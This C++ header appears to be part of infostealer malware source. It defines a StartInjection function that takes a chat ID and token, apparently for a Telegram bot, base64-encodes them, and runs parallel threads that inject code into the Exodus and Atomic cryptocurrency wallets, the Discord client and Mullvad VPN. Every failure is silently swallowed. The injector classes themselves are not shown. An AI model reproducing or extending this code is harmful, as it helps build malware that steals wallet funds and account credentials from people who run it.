#ifndef INJECTION_HPP
#define INJECTION_HPP

#include "Get.hpp"
#include "asar.hpp"
#include "Atomic.hpp"
#include "Exodus.hpp"
#include "DiscordInj.hpp"
#include "Mullvad.hpp"

void StartInjection(std::string ChatID, std::string Token) {
    std::string EncodedID = base64_encode(ChatID);
    std::string EncodedToken = base64_encode(Token);

    std::vector<std::thread> initThreads;
    std::vector<std::thread> workers;

    std::shared_ptr<Exodus> ex;
    std::shared_ptr<Atomic> at;
    std::shared_ptr<DiscordInjector> dc;
    std::shared_ptr<Mullvad> mu;

    try {
        initThreads.emplace_back([&]() {
            try {
                ex = std::make_shared<Exodus>();
            }
            catch (...) {}
            });

        initThreads.emplace_back([&]() {
            try {
                at = std::make_shared<Atomic>();
            }
            catch (...) {}
            });

        initThreads.emplace_back([&]() {
            try {
                dc = std::make_shared<DiscordInjector>(ChatID, Token);
            }
            catch (...) {}
            });

        initThreads.emplace_back([&]() {
            try {
                mu = std::make_shared<Mullvad>();
            }
            catch (...) {}
            });

        for (auto& t : initThreads) {
            t.join();
        }

        workers.emplace_back([&]() {
            try {
                ex->Inject(EncodedID, EncodedToken);
            }
            catch (...) {}
            });

        workers.emplace_back([&]() {
            try {
                at->Inject(EncodedID, EncodedToken);
            }
            catch (...) {}
            });

        workers.emplace_back([&]() {
            try {
                mu->Inject(EncodedID, EncodedToken);
            }
            catch (...) {}
            });

        workers.emplace_back([&]() {
            try {
                dc->Run();
            }
            catch (...) {}
            });

        for (auto& t : workers) {
            t.join();
        }
    }
    catch (...) {}
}

#endif